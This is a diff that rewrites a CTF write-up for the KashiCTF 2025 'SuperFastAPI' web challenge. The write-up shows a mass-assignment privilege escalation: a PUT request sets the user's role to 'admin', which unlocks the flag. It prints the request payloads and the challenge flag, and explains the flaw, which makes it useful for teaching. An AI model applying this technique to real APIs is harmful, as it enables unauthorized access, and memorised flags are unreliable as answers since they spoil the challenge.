@@ -1,46 +1,97 @@
-# Challenge Description 
+# SuperFastAPI - KashiCTF 2025 Writeup
 
-![image](https://github.com/user-attachments/assets/c1d07c2c-8b94-4c0c-8212-ab9bd6947ec8)
+## Challenge Information
+- **Name**: SuperFastAPI
+- **Points**: 100
+- **Category**: Web
+- **Solved by**: TrendoD
+- **Challenge link**: http://kashictf.iitbhucybersec.in:20375/
 
-Solved by : TrendoD
-Challenge link : http://kashictf.iitbhucybersec.in:20375/
+## Challenge Description
+The challenge presents a simple API with the message:
+> Made my very first API! However I have to still integrate it with a frontend so can't do much at this point lol.
 
+## Initial Reconnaissance
+When I first accessed the website, I was greeted with this welcome message:
+```
+{"message":"Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"}
+```
 
-First when i accessed the website it has this message welcome
-![image](https://github.com/user-attachments/assets/6922fb15-4a4f-4d67-b4b4-5c7ab3974684)
+## Discovering the API Documentation
+Since this was an API, I searched for common API documentation paths and discovered a `/docs` directory which revealed a Swagger UI interface for the API.
 
-Because this is a API im search a another directory and got a /docs directory
+The documentation showed several available endpoints:
+- GET `/` - Root endpoint
+- GET `/get/{username}` - Get User
+- POST `/create/{username}` - Create User
+- PUT `/update/{username}` - Update User
+- GET `/flag/{username}` - Get Flag
 
-![image](https://github.com/user-attachments/assets/8a4fb77d-91dc-4f90-835c-34731ab1087b)
+## Exploitation Steps
 
+### 1. Creating a User
+First, I created a user by sending a POST request to `/create/{username}` with the following JSON payload:
+```json
+{
+  "name": "trendo",
+  "email": "trendo",
+  "password": "trendo",
+  "gender": "trendo"
+}
+```
 
-In the docs we can Create User , Read user , Update user , and get the flag
+The API responded with a successful message:
+```json
+{"message": "User created!"}
+```
 
-![image](https://github.com/user-attachments/assets/35e98366-8dfc-4378-8d31-660787d67a30)
+### 2. Attempting to Get the Flag
+After creating the user, I tried to get the flag by sending a GET request to `/flag/trendo`, but received an error indicating that only admin users can access the flag.
 
-so first im create a user 
+### 3. Checking User Role
+I then checked the current user information by sending a GET request to `/get/trendo` and found that my user had been assigned the "guest" role:
 
-![image](https://github.com/user-attachments/assets/ba781f8f-e2bd-412f-8b4d-4c324c478cb9)
-![image](https://github.com/user-attachments/assets/698fca12-83df-40eb-91dd-10d8628c2ff1)
+```json
+{
+  "message": {
+    "name": "trendo",
+    "email": "trendo",
+    "password": "trendo",
+    "gender": "trendo",
+    "role": "guest"
+  }
+}
+```
 
-then after creating the user im trying to get the flag
+### 4. Privilege Escalation
+I discovered that the API allowed arbitrary updates to user properties, including the role field. I sent a PUT request to `/update/trendo` with this JSON payload:
+```json
+{
+  "name": "trendo",
+  "email": "trendo",
+  "password": "trendo",
+  "gender": "trendo",
+  "role": "admin"
+}
+```
 
-![image](https://github.com/user-attachments/assets/618132e4-5a5a-4a25-88a3-fe4c49973242)
+### 5. Verifying Admin Access
+After updating the user, I verified that my role had been changed to "admin" by sending another GET request to `/get/trendo`.
 
-the flag cannot we get if we are not the admin, so i check on the read user
+### 6. Obtaining the Flag
+Finally, I was able to get the flag by sending a GET request to `/flag/trendo`.
 
-![image](https://github.com/user-attachments/assets/5bc44b7e-6f44-4d4c-8b8a-758efbe42ff9)
+## Flag
+```
+KashiCTF{m455_4551gnm3n7_ftw_WlpSPDZdR}
+```
 
-im found out if we are role guest , so im trying to update my user to become a role admin
+## Vulnerability Analysis
+The vulnerability in this challenge was an **Insecure Direct Object Reference (IDOR)** and **Mass Assignment** vulnerability. The API allowed users to:
 
-![image](https://github.com/user-attachments/assets/91dddc48-9c74-4b2c-b502-42b8e8e53494)
+1. Create an account with basic privileges
+2. Directly modify security-critical properties (the role field)
+3. Escalate privileges by assigning themselves the admin role
+4. Access restricted resources with the elevated privileges
 
-after that im checking again my user and its already become the admin role
-
-![image](https://github.com/user-attachments/assets/24d286b4-c294-4d31-95ec-304decd6e372)
-
-after that im trying to get the flag and we got it!
-
-![image](https://github.com/user-attachments/assets/bd6c6754-11b7-40dd-b88a-be9c99428cb3)
-
-FLAG : KashiCTF{m455_4551gnm3n7_ftw_WlpSPDZdR}
+This is a common vulnerability in APIs where proper authorization checks are not implemented for update operations, allowing users to modify fields that should be protected.
